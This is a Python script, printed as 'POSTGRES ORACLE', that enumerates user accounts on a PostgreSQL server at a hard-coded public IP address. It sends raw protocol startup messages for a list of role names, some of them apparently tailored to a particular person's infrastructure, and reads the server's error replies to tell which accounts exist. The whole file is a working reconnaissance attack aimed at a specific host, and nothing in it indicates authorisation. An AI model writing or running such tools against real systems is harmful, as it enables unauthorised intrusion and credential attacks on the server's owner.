import socket
import ssl
import struct
import sys
import time

TARGET_IP = "79.137.248.131"
PORT = 5432

# Expanded list based on typical infra
POTENTIAL_USERS = [
    "postgres", "root", "admin", "orehus", "gitea", "forgejo", "git", 
    "gitlab", "synapse", "matrix", "docker", "backup", "repl", 
    "replication", "monitor", "prometheus", "grafana", "d3v1l", 
    "doesnm", "r00ter33", "dev", "test"
]

def check_user_existence(user):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_IP, PORT))
        
        # SSL Request
        sock.sendall(struct.pack('!II', 8, 80877103))
        resp = sock.recv(1)
        
        if resp == b'S':
            s = ssl.wrap_socket(sock)
        elif resp == b'N':
            s = sock
        else:
            return "UNKNOWN_PROTO"

        # Startup Message (user=user, db=user) - standard assumption
        # If DB doesn't exist, we get "database does not exist", implying user MIGHT exist
        # We try 'template1' which always exists to isolate User check
        
        proto = struct.pack('!I', 196608) 
        params = b'user\x00' + user.encode() + b'\x00'
        params += b'database\x00template1\x00'
        params += b'\x00'
        msg = struct.pack('!I', 4 + len(proto) + len(params)) + proto + params
        
        s.sendall(msg)
        
        # Read Response
        header = s.recv(5)
        if not header: return "CLOSED"
        
        msg_type = header[0:1]
        
        if msg_type == b'R':
            # Authentication Request - means USER EXISTS and DB EXISTS
            # We are asked for password
            return "\033[92mEXISTS (Auth Req)\033[0m"
            
        elif msg_type == b'E':
            # Error Response. We need to parse fields.
            # Field format: type(1) + string + null
            length = struct.unpack('!I', header[1:5])[0]
            body = s.recv(length - 4)
            
            # Simple string search in error body
            try:
                err_str = body.decode('utf-8', errors='ignore')
            except:
                err_str = str(body)

            if "password authentication failed" in err_str:
                 return "\033[92mEXISTS (Bad Pass)\033[0m"
            elif "role" in err_str and "does not exist" in err_str:
                 return "\033[91mNOT FOUND\033[0m"
            elif "database" in err_str and "does not exist" in err_str:
                 # This implies User Exists, but DB doesn't. 
                 # Since we used 'template1', this is rare, but implies User is valid.
                 return "\033[92mEXISTS (Bad DB)\033[0m"
            else:
                 return f"ERROR: {err_str[:50]}..."
                 
        return "UNKNOWN_RESP"

    except Exception as e:
        return f"EX: {e}"
    finally:
        try: s.close()
        except: pass

print("--- POSTGRES ORACLE ---")
print(f"Target: {TARGET_IP}:{PORT}")

for u in POTENTIAL_USERS:
    res = check_user_existence(u)
    print(f"User '{u}': {res}")
    time.sleep(0.5)
